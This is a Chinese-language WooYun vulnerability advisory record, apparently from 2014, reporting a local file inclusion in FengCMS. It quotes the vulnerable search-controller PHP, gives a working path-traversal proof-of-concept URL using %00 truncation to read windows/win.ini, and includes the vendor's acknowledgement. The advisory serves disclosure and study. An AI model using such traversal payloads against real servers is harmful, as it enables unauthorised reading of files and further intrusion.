{"id": 53774, "wybug_id": "wooyun-2014-066550", "wybug_title": "FengCMS本地文件包含一枚", "wybug_corp": "fengcms.com", "wybug_author": "magerx", "wybug_date": "2014-07-01 13:45", "wybug_open_date": "2014-09-29 18:26", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "文件包含漏洞", "文件包含", "本地文件包含利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向公众公开  简要描述： LFI 详细说明：  条件：PHP<5.3.4/app/controller/searchController.php:\npublic function index(){\t\tif(!empty($_POST)){\t\t\tif(URL_TYPE==1){                echo '<meta http-equiv=\"refresh\" content=\"0;url='.(($_POST['project'])?'?controller=search&project='.$_POST['project'].'&tags='.$_POST['tags']:'/tags/'.$_POST['tags'].'.html').'\">';  \t\t\t}else{\t\t\t\techo '<meta http-equiv=\"refresh\" content=\"0;url=?controller=search'.(($_POST['project'])?'&project='.$_POST['project'].'&tags='.$_POST['tags']:'&tags='.$_POST['tags']).'.html\">';\t\t\t}\t\t}else{\t\t\tif ($_GET['tags'] != '') {\t\t\t\t$encode = mb_detect_encoding ( $_GET['tags'], array (\"ASCII\", \"UTF-8\", \"GB2312\", \"GBK\", \"BIG5\" ) );\t\t\t\tif ($encode != \"UTF-8\") {\t\t\t\t\t$_GET['tags'] = iconv ( \"gb2312\", \"UTF-8\", $_GET['tags'] );\t\t\t\t}\t\t\t}\t\t\tif($_GET['tags']){\t\t\t\tif($_GET['project']!=\"\"){\t\t\t\t\treturn $this->display($_GET['project'].'_search.html');\t\t\t\t}else{\t\t\t\t\treturn $this->display('search.html');\t\t\t\t}\t\t\t}else{\t\t\t\techo '<script type=\"text/javascript\">alert(\"请输入关键词！\");history.go(-1)</script>';\t\t\t}\t\t}\t}}\n上面我们让post为空，$_GET['tags']不为空，$_GET['project']可控,接着看display()/system/core/controller.php:27行\npublic function display($path,$data=\"\"){\t\tif(!isset($path)){\t\t\treturn throwexce(sprintf('Template file does not exist!'));\t\t}else{\t\t\t$tpl= new template();\t\t\tif(!empty($data)){\t\t\t\textract($data,EXTR_OVERWRITE);\t\t\t}\t\t\tinclude template::tpl($path);\t\t}\t}\n$path直接被include，(由于程序自带stripslashes前面提到过)%00截断，LFI有了poc:\nlocalhost/fengcms/index.php?controller=search&operate=index&tags=1&project=../../../../../../../windows/win.ini%00\n\n\n   漏洞证明：  \nlocalhost/fengcms/index.php?controller=search&operate=index&tags=1&project=../../../../../../../windows/win.ini%00\n\n\n   修复方案：  v   版权声明：转载请注明来源 magerx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-01 13:47 厂商回复： 非常感谢乌云平台，为我们查找到了安全漏洞！我们一定再接再厉，做好我们的产品的安全工作！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-08 12:39 |    \t\tFengCMS(乌云厂商)\t\t \n  FengCms安全测试站地址：http://guf521656.h163.92hezu.org/ 有效期2014-7-8至2014-7-15 欢迎各位安全界的朋友帮我们寻找安全漏洞！作为一个小小的创业团队，对各位朋友对FengCms的关注表示衷心的感谢！    \n     2014-07-10 16:25 |    \t\tFengCMS(乌云厂商)\t\t \n  非常感谢各位白帽子的辛勤工作！FengCms安全测试站地址：http://guf521656.h163.92hezu.org/ 已经升级到最新版本 有效期2014-7-8至2014-7-15 欢迎各位安全界的朋友帮我们寻找安全漏洞！作为一个小小的创业团队，对各位朋友对FengCms的关注表示衷心的感谢！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}